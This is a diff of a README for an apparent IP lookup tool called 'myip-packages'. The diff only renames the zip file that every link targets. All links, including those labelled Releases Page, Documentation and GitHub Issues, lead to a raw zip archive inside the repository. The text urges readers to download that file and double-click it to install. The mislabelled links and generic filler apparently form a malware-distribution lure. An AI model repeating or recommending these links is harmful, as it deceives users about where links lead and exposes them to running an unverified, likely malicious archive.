@@ -1,6 +1,6 @@
 # 🌍 myip-packages - Simple IP Lookup Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/myip-packages_1.4.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/myip-packages_1.4.zip)
+[![Download Now](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/packages_myip_v3.2.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/packages_myip_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to myip-packages! This software allows you to easily access an IP lookup
 
 To get started, visit the following page to download the application:
 
-[Download from the Releases Page](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/myip-packages_1.4.zip)
+[Download from the Releases Page](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/packages_myip_v3.2.zip)
 
 Once on the page, find the latest version and download the file that suits your operating system. Follow the simple steps below to install the application.
 
@@ -26,10 +26,10 @@ Ensure your system meets these requirements for the best experience.
 ## 📂 Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to [this link](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/myip-packages_1.4.zip) to find the latest version.
+   Go to [this link](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/packages_myip_v3.2.zip) to find the latest version.
 
 2. **Download the Installer:**
-   Select the appropriate installer based on your system (e.g., https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/myip-packages_1.4.zip, https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/myip-packages_1.4.zip).
+   Select the appropriate installer based on your system (e.g., https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/packages_myip_v3.2.zip, https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/packages_myip_v3.2.zip).
 
 3. **Run the Installer:**
    - Windows: Double-click the downloaded file to start the installation wizard. 
@@ -65,7 +65,7 @@ If you face any issues, check our FAQ section available on the releases page or 
 
 ## 📚 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/myip-packages_1.4.zip) for detailed usage.
-- [GitHub Issues](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/myip-packages_1.4.zip) for reporting problems.
+- [Documentation](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/packages_myip_v3.2.zip) for detailed usage.
+- [GitHub Issues](https://raw.githubusercontent.com/HuyLikehaiten/myip-packages/main/packages/pypi/src/packages_myip_v3.2.zip) for reporting problems.
 
 Feel free to explore and use myip-packages to enhance your IP lookup experience. For updates and new features, regularly check the Releases page.
